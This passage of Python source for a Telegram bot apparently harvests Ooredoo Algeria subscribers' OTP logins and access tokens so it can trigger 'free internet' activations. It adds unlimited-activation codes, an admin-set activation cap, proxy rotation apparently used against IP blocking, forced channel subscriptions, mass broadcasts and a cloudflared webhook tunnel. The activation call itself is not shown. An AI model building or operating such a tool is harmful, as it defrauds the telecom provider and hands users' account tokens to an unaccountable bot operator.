                ok = False
                break
            status = j.get("result", {}).get("status")
            if status not in ("member", "administrator", "creator"):
                ok = False
                break
        except Exception as e:
            logger.warning(f"check_sub exception: {e}")
            ok = False
            break

    with _sub_cache_lock:
        _sub_cache[chat_id] = (now, ok)
    return ok

def invalidate_sub_cache(chat_id=None):
    with _sub_cache_lock:
        if chat_id is None:
            _sub_cache.clear()
        else:
            _sub_cache.pop(chat_id, None)

async def send_join_msg(chat_id):
    kb_rows = []
    for ch in _forced_channels:
        link = f"https://t.me/{ch.replace('@', '')}"
        kb_rows.append([{"text": f"📢 اشترك في {ch}", "url": link}])
    kb_rows.append([{"text": "✅ تحقق من الاشتراك", "callback_data": "check_sub"}])
    await tg_request_async(
        "sendMessage",
        chat_id=chat_id,
        text="⚠️ <b>باش تستعمل البوت، لازم تشترك في القنوات:</b>",
        parse_mode="HTML",
        reply_markup={"inline_keyboard": kb_rows},
    )

# ════════════════════════════════════════════════════════════════════════════
# MENUS
# ════════════════════════════════════════════════════════════════════════════
async def oo_menu(chat_id, user=None):
    unlimited = chat_id in _unlimited_users or chat_id in ADMIN_IDS
    kb = [
        ["🌐 تفعيل انترنت مجاني"],
        ["🔓 تفعيل بدون قيد ✅"] if unlimited else ["🔓 تفعيل بدون قيد"],
        ["📱 تسجيل رقم جديد", "💰 الرصيد"],
        ["🚪 خروج"],
    ]
    if chat_id in ADMIN_IDS:
        kb.insert(1, ["⚙️ لوحة التحكم"])
    await tg_buttons_async(chat_id, "اختر من الأزرار 👇🏻", kb)

async def admin_menu(chat_id):
    proxy_status = "🟢 مفعل" if _proxy_mgr.enabled else "🔴 معطل"
    kb = [
        ["⚡ حالة البوت: يعمل 🟢",
         "🔧 الصيانة: " + ("مفعل 🔴" if _maintenance else "مغلق 🟢")],
        [f"📢 إدارة القنوات ({len(_forced_channels)})", "📣 إذاعة عامة"],
        [f"🔢 حد التفعيلات لكل رقم: {_max_activations}", "📊 إحصائيات"],
        [f"🌐 البروكسي: {proxy_status} ({_proxy_mgr.count})", "⚙️ إدارة البروكسي"],
        ["🔙 رجوع للقائمة"],
    ]
    text = (
        f"⚙️ <b>لوحة تحكم الأدمن</b>\n\n"
        f"👥 المستخدمون: {_bot_stats.get('users', 0)}\n"
        f"⚡ التفعيلات: {_bot_stats.get('activations', 0)}\n"
        f"🌐 البروكسي: {proxy_status} | العدد: {_proxy_mgr.count}\n"
    )
    await tg_buttons_async(chat_id, text, kb)

async def proxy_menu(chat_id):
    status = "🟢 مفعل" if _proxy_mgr.enabled else "🔴 معطل"
    kb = [
        [f"🔛 تشغيل/إيقاف: {status}"],
        ["➕ إضافة بروكسي", "📋 عرض البروكسيات"],
        ["🗑️ حذف بروكسي", "🧹 حذف الكل"],
        ["🔙 رجوع للوحة"],
    ]
    text = (
        f"⚙️ <b>إدارة البروكسي</b>\n\n"
        f"الحالة: {status}\n"
        f"العدد: {_proxy_mgr.count}\n\n"
        f"يدعم: http / https / socks4 / socks5"
    )
    await tg_buttons_async(chat_id, text, kb)

# ════════════════════════════════════════════════════════════════════════════
# UNLIMITED CODE
# ════════════════════════════════════════════════════════════════════════════
async def handle_unlimited_code_input(chat_id, code):
    code = code.strip().upper()
    if code in UNLIMITED_CODES:
        with _lock:
            _unlimited_users.add(chat_id)
        _save_async()
        await tg_buttons_async(
            chat_id,
            "✅ <b>تم تفعيل وضع بدون قيد!</b>\n\nالآن يمكنك التفعيل بدون أي حدود.",
            [["🔓 تفعيل بدون قيد ✅"], ["🔙 رجوع للقائمة"]]
        )
        return True
    else:
        # ❌ message auto-deletes after 4 seconds — never stays on screen
        await tg_send_then_delete(
            chat_id,
            "❌ الكود غير صحيح.",
            delay=4.0
        )
        return False

# ════════════════════════════════════════════════════════════════════════════
# ADMIN HANDLERS
# ════════════════════════════════════════════════════════════════════════════
async def handle_admin(chat_id, text):
    global _maintenance
    if chat_id not in ADMIN_IDS:
        return False

    if text in ("/admin", "⚙️ لوحة التحكم"):
        await admin_menu(chat_id)
        return True

    if text.startswith("🔢 حد التفعيلات لكل رقم:"):
        oo_set_session(chat_id, {"state": "admin_set_limit"})
        await tg_send_async_fn(
            chat_id,
            f"📝 أرسل العدد الجديد للتفعيلات المسموح بها لكل رقم (الحالي: {_max_activations}):"
        )
        return True

    if text == "⚡ حالة البوت: يعمل 🟢":
        await tg_send_async_fn(chat_id, "✅ البوت يعمل بشكل طبيعي.")
        return True

    if text.startswith("🔧 الصيانة"):
        _maintenance = not _maintenance
        _save_async()
        await admin_menu(chat_id)
        return True

    if text.startswith("📢 إدارة القنوات"):
        kb = [[f"❌ حذف {c}"] for c in _forced_channels]
        kb.append(["➕ إضافة قناة", "🔙 رجوع للوحة"])
        ch_list = "\n".join(f"- {c}" for c in _forced_channels) if _forced_channels else "لا توجد"
        await tg_buttons_async(chat_id, f"📢 <b>القنوات المضافة:</b>\n{ch_list}", kb)
        return True

    if text == "➕ إضافة قناة":
        oo_set_session(chat_id, {"state": "admin_add_channel"})
        await tg_send_async_fn(chat_id, "📝 أرسل يوزرنيم القناة (مثال: @mychannel):")
        return True

    if text.startswith("❌ حذف "):
        ch = text.replace("❌ حذف ", "").strip()
        if ch in _forced_channels:
            _forced_channels.remove(ch)
            _save_async()
            invalidate_sub_cache()
        await tg_send_async_fn(chat_id, f"✅ تم حذف {ch}")
        await admin_menu(chat_id)
        return True

    if text == "📣 إذاعة عامة":
        oo_set_session(chat_id, {"state": "admin_broadcast"})
        await tg_send_async_fn(chat_id, "📝 أرسل الرسالة التي تريد إذاعتها:")
        return True

    if text == "📊 إحصائيات":
        await tg_send_async_fn(
            chat_id,
            f"📊 <b>إحصائيات البوت</b>\n\n"
            f"👥 المستخدمون: {_bot_stats.get('users', 0)}\n"
            f"⚡ التفعيلات: {_bot_stats.get('activations', 0)}\n"
            f"📢 القنوات: {len(_forced_channels)}\n"
            f"🌐 البروكسي: {_proxy_mgr.count} ({'مفعل' if _proxy_mgr.enabled else 'معطل'})\n"
            f"🔓 مستخدمو بدون قيد: {len(_unlimited_users)}"
        )
        return True

    if text.startswith("🌐 البروكسي:") or text == "⚙️ إدارة البروكسي":
        await proxy_menu(chat_id)
        return True

    if text.startswith("🔛 تشغيل/إيقاف"):
        _proxy_mgr.toggle()
        _save_async()
        await proxy_menu(chat_id)
        return True

    if text == "➕ إضافة بروكسي":
        oo_set_session(chat_id, {"state": "admin_add_proxy"})
        await tg_send_async_fn(
            chat_id,
            "📝 أرسل البروكسي/البروكسيات (واحد في كل سطر).\n"
            "الصيغ المدعومة:\n"
            "<code>http://user:pass@host:port</code>\n"
            "<code>https://host:port</code>\n"
            "<code>socks5://host:port</code>\n"
            "<code>socks4://host:port</code>"
        )
        return True

    if text == "📋 عرض البروكسيات":
        items = _proxy_mgr.list_all()
        if not items:
            await tg_send_async_fn(chat_id, "📭 لا توجد بروكسيات مضافة.")
        else:
            body = "\n".join(f"{i+1}. <code>{p['url']}</code> ({p['type']})"
                             for i, p in enumerate(items[:50]))
            if len(items) > 50:
                body += f"\n... و{len(items)-50} أخرى"
            await tg_send_async_fn(chat_id, f"🌐 <b>البروكسيات ({len(items)}):</b>\n\n{body}")
        await proxy_menu(chat_id)
        return True

    if text == "🗑️ حذف بروكسي":
        oo_set_session(chat_id, {"state": "admin_del_proxy"})
        await tg_send_async_fn(chat_id, "📝 أرسل البروكسي لحذفه (كما هو مكتوب):")
        return True

    if text == "🧹 حذف الكل":
        _proxy_mgr.clear()
        _save_async()
        await tg_send_async_fn(chat_id, "✅ تم حذف جميع البروكسيات.")
        await proxy_menu(chat_id)
        return True

    if text == "🔙 رجوع للوحة":
        await admin_menu(chat_id)
        return True

    return False

async def handle_admin_state(chat_id, text):
    global _max_activations
    sess = oo_get_session(chat_id)
    state = sess.get("state", "")

    if state == "admin_set_limit":
        raw = text.strip()
        if not raw.isdigit():
            await tg_send_async_fn(chat_id, "❌ الرجاء إدخال رقم صحيح.")
            return True
        new_limit = int(raw)
        if new_limit < 1:
            await tg_send_async_fn(chat_id, "❌ يجب أن يكون العدد 1 على الأقل.")
            return True
        _max_activations = new_limit
        _save_async()
        await tg_send_async_fn(chat_id, f"✅ تم تغيير الحد الأقصى للتفعيلات إلى: {_max_activations} لكل رقم.")
        oo_clear_session(chat_id)
        await admin_menu(chat_id)
        return True

    if state == "admin_add_channel":
        ch = text.strip()
        if not ch.startswith("@"):
            ch = "@" + ch
        if ch not in _forced_channels:
            _forced_channels.append(ch)
            _save_async()
            invalidate_sub_cache()
            await tg_send_async_fn(chat_id, f"✅ تم إضافة القناة {ch}")
        else:
            await tg_send_async_fn(chat_id, "⚠️ القناة موجودة مسبقاً.")
        oo_clear_session(chat_id)
        await admin_menu(chat_id)
        return True

    if state == "admin_broadcast":
        uids = list(_users.keys())
        oo_clear_session(chat_id)
        async def _bc():
            cnt = 0
            for uid in uids:
                try:
                    await tg_send_async_fn(uid, text)
                    cnt += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
            await tg_send_async_fn(chat_id, f"✅ تم إرسال الرسالة لـ {cnt} مستخدم.")
            await admin_menu(chat_id)
        asyncio.create_task(_bc())
        return True

    if state == "admin_add_proxy":
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        added = 0
        failed = 0
        for l in lines:
            r = _proxy_mgr.add(l)
            if r is True:
                added += 1
            elif r is None:
                failed += 1
        _save_async()
        await tg_send_async_fn(chat_id, f"✅ تم إضافة {added} بروكسي (فشل: {failed}).\nالإجمالي: {_proxy_mgr.count}")
        oo_clear_session(chat_id)
        await proxy_menu(chat_id)
        return True

    if state == "admin_del_proxy":
        raw = text.strip()
        ok = _proxy_mgr.remove(raw)
        if ok:
            _save_async()
            await tg_send_async_fn(chat_id, "✅ تم حذف البروكسي.")
        else:
            await tg_send_async_fn(chat_id, "❌ لم يتم العثور على البروكسي.")
        oo_clear_session(chat_id)
        await proxy_menu(chat_id)
        return True

    return False

# ════════════════════════════════════════════════════════════════════════════
# MAIN HANDLER
# ════════════════════════════════════════════════════════════════════════════
async def handle(chat_id, text):
    try:
        text = text.strip()

        # Admin first
        if chat_id in ADMIN_IDS:
            if await handle_admin(chat_id, text):
                return
            if await handle_admin_state(chat_id, text):
                return

        # Maintenance
        if _maintenance and chat_id not in ADMIN_IDS:
            await tg_send_async_fn(chat_id, "🔧 البوت في وضع الصيانة حالياً. عد لاحقاً.")
            return

        # Force subscribe
        if not await check_sub(chat_id):
            await send_join_msg(chat_id)
            return

        sess = oo_get_session(chat_id)
        state = sess.get("state", "")
        user = oo_get_user(chat_id)

        # /start
        if text == "/start":
            if user and user.get("access_token"):
                await oo_menu(chat_id, user)
                return
            oo_set_session(chat_id, {"state": "awaiting_phone_input"})
            await tg_send_async_fn(chat_id, "👋 مرحباً!\nأرسل رقم أوريدو الخاص بك (مثال: 05XXXXXXXX) 📱")
            return

        # Awaiting unlimited code — ❌ auto-deletes, never persists
        if state == "awaiting_unlimited_code":
            ok = await handle_unlimited_code_input(chat_id, text)
            if ok:
                oo_clear_session(chat_id)
                await oo_menu(chat_id)
            # on failure: session stays, error msg auto-deleted after 4s
            return

        # Awaiting phone
        if state == "awaiting_phone_input":
            dg = "".join(c for c in text if c.isdigit())
            if not re.match(r'^05\d{8}$', dg):
                await tg_send_async_fn(chat_id, "❌ أدخل رقم أوريدو صحيح (مثال: 0550123456) 📱")
                return
            msisdn = "213" + dg[1:]
            oo_set_session(chat_id, {"state": "awaiting_otp", "msisdn": msisdn})
            await tg_buttons_async(
                chat_id,
                "✅ تم استلام رقمك!\n\n📩 أرسل رمز OTP اللي وصلك في SMS:",
                [["🔄 تجديد الرمز", "📱 تغيير الرقم"]]
            )
            async def _bg_send():
                try:
                    dev = oo_get_device(chat_id)
                    res = await oo_send_otp(msisdn, dev)
                    if not res:
                        await tg_send_async_fn(chat_id, "⚠️ تعذر إرسال OTP. جرّب 'تجديد الرمز'.")
                except Exception as e:
                    logger.error(f"bg_send: {e}")
            asyncio.create_task(_bg_send())
            return

        # Awaiting OTP
        if state == "awaiting_otp":
            if text == "🔄 تجديد الرمز":
                msisdn = sess.get("msisdn")
                await tg_buttons_async(chat_id, "⏳ جاري إرسال رمز جديد...",
                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
                async def _bg_resend():
                    try:
                        dev = oo_get_device(chat_id)
                        await oo_send_otp(msisdn, dev)
                    except Exception as e:
                        logger.error(f"bg_resend: {e}")
                asyncio.create_task(_bg_resend())
                return

            if text == "📱 تغيير الرقم":
                oo_clear_session(chat_id)
                oo_set_session(chat_id, {"state": "awaiting_phone_input"})
                await tg_send_async_fn(chat_id, "📱 أدخل رقم أوريدو الجديد (05XXXXXXXX):")
                return

            if not text.isdigit() or len(text) != 6:
                await tg_buttons_async(chat_id, "❌ رمز OTP يجب أن يكون 6 أرقام",
                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
                return

            msisdn = sess.get("msisdn")
            dev = oo_get_device(chat_id)
            res = await oo_verify_otp(msisdn, text, dev)

            if res == "wrong_otp":
                await tg_buttons_async(chat_id, "❌ الرمز خاطئ، جرب مجدداً",
                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
                return
            if not res:
                await tg_send_async_fn(chat_id, "❌ سيرفر غير متاح أو IP محظور.")
                oo_clear_session(chat_id)
                return

            nu = {"msisdn": msisdn, "operator": "ooredoo"}
            nu.update(res)
            oo_save_user(chat_id, nu)
            oo_clear_session(chat_id)
            await tg_send_async_fn(chat_id, "🎉 تم تسجيل الدخول بنجاح!")
            await oo_menu(chat_id, oo_get_user(chat_id))
            return

        # No user
        if not user or not user.get("access_token"):
            oo_set_session(chat_id, {"state": "awaiting_phone_input"})
            await tg_send_async_fn(chat_id, "📱 أرسل رقم أوريدو (05XXXXXXXX):")
            return

        # New number
        if text == "📱 تسجيل رقم جديد":
            oo_delete_user(chat_id)
            oo_clear_session(chat_id)
            oo_set_session(chat_id, {"state": "awaiting_phone_input"})
            await tg_send_async_fn(chat_id, "📱 أرسل رقم أوريدو الجديد (05XXXXXXXX):")
            return

        # Unlimited activation
        if text.startswith("🔓 تفعيل بدون قيد"):
            if chat_id in _unlimited_users or chat_id in ADMIN_IDS:
                await oo_do_open_box(chat_id, user, unlimited=True)
                return
            else:
                oo_set_session(chat_id, {"state": "awaiting_unlimited_code"})
                await tg_send_async_fn(
                    chat_id,
                    "🔑 <b>أدخل كود التفعيل بدون قيد:</b>\n\nأرسل الكود الخاص بك."
                )
                return

        # Normal activation
        if text == "🌐 تفعيل انترنت مجاني":
            await oo_do_open_box(chat_id, user, unlimited=False)
            return

        # Balance
        if text == "💰 الرصيد":
            m = user.get("msisdn", "")
            h = oo_authed_h(m, user.get("access_token"), {
                "tok_timestamp": user.get("tok_timestamp"),
                "tok_instance_id": user.get("tok_instance_id"),
                "tok_plat_sig": user.get("tok_plat_sig"),
            })
            r = await oo_http_async("GET",
                        f"{OOREDOO_BFF}/subscriptions/getAccountInfo?msisdn={m}", h)
            if r and r.get("code") == 200:
                bal = r["json"].get("accountBalance", "0")
                await tg_buttons_async(chat_id, f"💸 الرصيد : {bal} دج", [["🔙 رجوع للقائمة"]])
            else:
                await tg_buttons_async(chat_id, "❌ تعذر الجلب", [["🔙 رجوع للقائمة"]])
            return

        # Logout
        if text == "🚪 خروج":
            oo_delete_user(chat_id)
            oo_clear_session(chat_id)
            await tg_send_async_fn(chat_id, "✅ تم تسجيل الخروج.\n\nأرسل /start للبدء من جديد.")
            return

        if text == "🔙 رجوع للقائمة":
            await oo_menu(chat_id, user)
            return

        await oo_menu(chat_id, user)

    except Exception as e:
        logger.exception(f"handle: {e}")
        try:
            await tg_send_async_fn(chat_id, "⚠️ حدث خطأ، حاول مجدداً.")
        except:
            pass

# ════════════════════════════════════════════════════════════════════════════
# WEBHOOK SERVER (aiohttp)
# ════════════════════════════════════════════════════════════════════════════
_update_semaphore: asyncio.Semaphore = None  # initialized in main

async def process_update(upd: dict):
    """Process one Telegram update — enforces concurrency limit per user."""
    try:
        # Callback query
        cb = upd.get("callback_query")
        if cb:
            cb_id = cb.get("id")
            cb_msg = cb.get("message", {}) or {}
            chat_id = cb_msg.get("chat", {}).get("id")
            data_cb = cb.get("data")

            if data_cb == "check_sub" and chat_id:
                invalidate_sub_cache(chat_id)
                if await check_sub(chat_id):
                    await tg_request_async("answerCallbackQuery",
                                           callback_query_id=cb_id,
                                           text="✅ تم التحقق من الاشتراك!")
                    msg_id = cb_msg.get("message_id")
                    if msg_id:
                        await tg_delete_msg(chat_id, msg_id)
                    asyncio.create_task(handle(chat_id, "/start"))
                else:
                    await tg_request_async("answerCallbackQuery",
                                           callback_query_id=cb_id,
                                           text="❌ مازلت ما شتركتش في جميع القنوات!",
                                           show_alert=True)
                    await send_join_msg(chat_id)
            else:
                await tg_request_async("answerCallbackQuery",
                                       callback_query_id=cb_id)
            return

        # Message
        msg = upd.get("message")
        if not msg:
            return
        chat_id = msg.get("chat", {}).get("id")
        text = msg.get("text", "").strip()
        if not chat_id or not text:
            return

        # Save username/firstname
        from_user = msg.get("from", {})
        if from_user:
            upd_user = {}
            if from_user.get("username"):
                upd_user["username"] = from_user["username"]
            if from_user.get("first_name"):
                upd_user["first_name"] = from_user["first_name"]
            if upd_user:
                u = oo_get_user(chat_id) or {}
                changed = any(u.get(k) != v for k, v in upd_user.items())
                if changed or not u:
                    oo_save_user(chat_id, upd_user)

        # High-concurrency: fire and forget, semaphore limits simultaneous handlers
        async def _run_with_sem():
            async with _update_semaphore:
                await handle(chat_id, text)
        asyncio.create_task(_run_with_sem())

    except Exception as e:
        logger.exception(f"process_update: {e}")

async def webhook_handler(request: web.Request) -> web.Response:
    """aiohttp webhook endpoint — receives and dispatches updates immediately."""
    try:
        upd = await request.json()
        asyncio.create_task(process_update(upd))
        return web.Response(text="OK")
    except Exception as e:
        logger.warning(f"webhook_handler: {e}")
        return web.Response(text="OK")  # always 200 to Telegram

async def health_handler(request: web.Request) -> web.Response:
    return web.json_response({"status": "ok", "users": len(_users), "activations": _bot_stats.get("activations", 0)})

# ════════════════════════════════════════════════════════════════════════════
# CLOUDFLARE TUNNEL (cloudflared — free, no account needed)
# ════════════════════════════════════════════════════════════════════════════
_cloudflare_url = None

def _install_cloudflared():
    """Auto-install cloudflared if not present."""
    if os.path.exists("/usr/local/bin/cloudflared"):
        return True
    logger.info("📥 تثبيت cloudflared...")
    try:
        import platform
        arch = platform.machine()
        if "x86_64" in arch or "amd64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        elif "aarch64" in arch or "arm64" in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

        import urllib.request
        urllib.request.urlretrieve(url, "/usr/local/bin/cloudflared")
        os.chmod("/usr/local/bin/cloudflared", 0o755)
        logger.info("✅ cloudflared مثبت.")
        return True
    except Exception as e:
        logger.error(f"cloudflared install failed: {e}")
        return False

def _start_cloudflared(port: int):
    """Start cloudflared tunnel in background, parse the public URL."""
    global _cloudflare_url
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}",
             "--no-autoupdate"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        import re as _re
        url_pattern = _re.compile(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com')
        for line in proc.stdout:
            line = line.strip()
            m = url_pattern.search(line)
            if m:
                _cloudflare_url = m.group(0)
                logger.info(f"🌐 Cloudflare URL: {_cloudflare_url}")
                break
        return proc
    except FileNotFoundError:
        logger.error("cloudflared not found. يرجى تثبيته يدوياً.")
        return None

async def _set_webhook(public_url: str):
    """Register webhook with Telegram."""
    webhook_url = public_url + WEBHOOK_PATH
    result = await tg_request_async(
        "setWebhook",
        url=webhook_url,
        allowed_updates=["message", "callback_query"],
        drop_pending_updates=True,
        max_connections=100,
    )
    if result and result.get("ok"):
        logger.info(f"✅ Webhook set: {webhook_url}")
    else:
        logger.error(f"❌ Webhook failed: {result}")

# ════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
async def main():
    global _update_semaphore

    if not TELEGRAM_BOT_TOKEN:
        logger.error("❌ TELEGRAM_BOT_TOKEN غير معرّف.")
        sys.exit(1)

    # Semaphore: max 300 concurrent handlers (protects event loop under load)
    _update_semaphore = asyncio.Semaphore(300)

    _load_from_disk()
    await _init_aio_sessions()

    logger.info("🚀 Bot Starting (Webhook Mode)...")
    logger.info(f"👑 Admins: {ADMIN_IDS}")
    logger.info(f"📢 Forced channels: {_forced_channels}")
    logger.info(f"🔓 Unlimited codes: {len(UNLIMITED_CODES)}")
    logger.info(f"🌐 Proxy: {'ON' if _proxy_mgr.enabled else 'OFF'} | Count: {_proxy_mgr.count}")

    # Start cloudflared in background thread (blocking URL parse)
    _install_cloudflared()
    loop = asyncio.get_event_loop()
    cf_proc = await loop.run_in_executor(None, _start_cloudflared, WEBHOOK_PORT)

    if _cloudflare_url:
        await _set_webhook(_cloudflare_url)
        logger.info(f"✅ Webhook active at: {_cloudflare_url}{WEBHOOK_PATH}")
    else:
        logger.warning("⚠️ Cloudflare URL not found. Set webhook manually.")

    # Build aiohttp app
    app = web.Application()
    app.router.add_post(WEBHOOK_PATH, webhook_handler)
    app.router.add_get("/health", health_handler)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEBHOOK_PORT)
    await site.start()

    logger.info(f"🔊 Webhook server listening on port {WEBHOOK_PORT}")

    try:
        # Keep alive forever
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, asyncio.CancelledError):
        logger.info("Stopping...")
    finally:
        await runner.cleanup()
        if _aio_session:
            await _aio_session.close()
        if _aio_tg_session:
            await _aio_tg_session.close()
        if cf_proc:
            cf_proc.terminate()

if __name__ == "__main__":
    asyncio.run(main())
